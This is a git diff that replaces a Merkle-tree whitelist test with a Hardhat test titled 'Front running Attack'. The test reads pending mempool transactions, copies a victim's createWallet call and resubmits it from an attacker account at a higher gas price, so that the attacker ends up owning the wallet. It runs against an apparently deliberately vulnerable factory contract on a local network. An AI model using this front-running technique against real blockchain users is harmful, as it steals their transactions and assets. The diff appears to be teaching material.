@@ -1,67 +1,56 @@
-import { expect } from "chai";
-import keccak256 from "keccak256";
-import { MerkleTree } from "merkletreejs";
+import { assert } from "chai";
 import { ethers } from "hardhat";
-import { encodeLeaf } from "../utils/encodeLeaf"
+import { Wallet, FactoryWithAttack } from "../typechain-types"
+import { BigNumber, Signer } from "ethers";
 
-describe("Merkle Trees", function () {
-  it("Should be able to verify if address is in whitelist or not", async function () {
+describe("Front running Attack ", function () {
+  let owner: Signer, alice: Signer, attacker: Signer, factory: FactoryWithAttack
 
-    // Get a bunch of test addresses
-    // Hardhat returns 10 signers when running in a test environment
-    const testAddresses = await ethers.getSigners();
+  before(async () => {
+    [owner, alice, attacker] = await ethers.getSigners();
+    const Factory = await ethers.getContractFactory('FactoryWithAttack');
+    factory = await Factory.connect(owner).deploy();
 
-    // Create an array of ABI-encoded elements to put in the Merkle Tree
-    const list = [
-      encodeLeaf(testAddresses[0].address, 2),
-      encodeLeaf(testAddresses[1].address, 2),
-      encodeLeaf(testAddresses[2].address, 2),
-      encodeLeaf(testAddresses[3].address, 2),
-      encodeLeaf(testAddresses[4].address, 2),
-      encodeLeaf(testAddresses[5].address, 2),
-    ];
+  })
+  it("Perform the Front Running Attack", async function () {
+    // create random salt  
+    const salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("SomeRandomSalt"));
+    // here we made call for create wallet
+    await factory.connect(alice).createWallet(salt);
 
-    // Using keccak256 as the hashing algorithm, create a Merkle Tree
-    // We use keccak256 because Solidity supports it
-    // We can use keccak256 directly in smart contracts for verification
-    // Make sure to sort the tree so it can be reproduced deterministically each time
-    const merkleTree = new MerkleTree(list, keccak256, {
-      hashLeaves: true, // Hash each leaf using keccak256 to make them fixed-size
-      sortPairs: true, // Sort the tree for determinstic output
-      sortLeaves: true,
-    });
+    // get all pending transaction from mempool
+    const tsx = await ethers.provider.send('eth_getBlockByNumber', [
+      'pending',
+      true
+    ]);
 
-    // Compute the Merkle Root in Hexadecimal
-    const root = merkleTree.getHexRoot();
 
-    // Deploy the Whitelist Contract
-    const whitelist = await ethers.getContractFactory("MerkleTree");
-    const Whitelist = await whitelist.deploy(root);
-    await Whitelist.deployed();
+    // Now it time to find transaction which we are intrested
+    // we are looking for any transaction from factory
+    const tx = tsx.transactions.find((tx: any) => tx.to === factory.address.toLowerCase())
 
-    // Check for valid addresses
-    for (let i = 0; i < 6; i++) {
-      // Compute the Merkle Proof for `testAddresses[i]`
-      const leaf = keccak256(list[i]); // The hash of the node
-      const proof = merkleTree.getHexProof(leaf); // Get the Merkle Proof
+    // Once we found  we will resend some transaction to get profile from it
+    await attacker.sendTransaction({
+      to: tx.to,
+      data: tx.input,
+      gasLimit: ethers.BigNumber.from(30000000),
+      gasPrice: ethers.BigNumber.from(tx.gasPrice).add(100),
+    })
+    // We are using hardhat network so we control of minting on transction on network
+    // Mint All transaction
+    await ethers.provider.send("evm_mine", [])
 
-      // Connect the current address being tested to the Whitelist contract
-      // as the 'caller'. So the contract's `msg.sender` value is equal to the value being checked
-      // This is done because our contract uses `msg.sender` as the 'original value' for
-      // the address when verifying the Merkle Proof
-      const connectedWhitelist = await Whitelist.connect(testAddresses[i]);
+    // get wallet contract address with attacker address
+    const addressWallet = await factory.walletOwner(attacker.getAddress());
+    console.log("wallet.owner()", addressWallet);
 
-      // Verify that the contract can verify the presence of this address
-      // in the Merkle Tree using just the Root provided to it
-      // By giving it the Merkle Proof and the original values
-      // It calculates `address` using `msg.sender`, and we provide it the number of NFTs
-      // that the address can mint ourselves
-      const verified = await connectedWhitelist.checkInWhitelist(proof, 2);
-      expect(verified).to.equal(true);
-    }
+    // get wallet contract
+    const wallet: Wallet = await ethers.getContractAt("Wallet", addressWallet, attacker);
+    await ethers.provider.send("evm_mine", []);
+    console.log("wallet.owner()", await wallet.owner());
 
-    // Check for invalid addresses
-    const verifiedInvalid = await Whitelist.checkInWhitelist([], 2);
-    expect(verifiedInvalid).to.equal(false);
+    assert.equal(await factory.walletOwner(await alice.getAddress()), ethers.constants.AddressZero);
+    assert.equal(await wallet.owner(), await attacker.getAddress());
+    assert.equal(await wallet.initialized(), true);
   })
 })
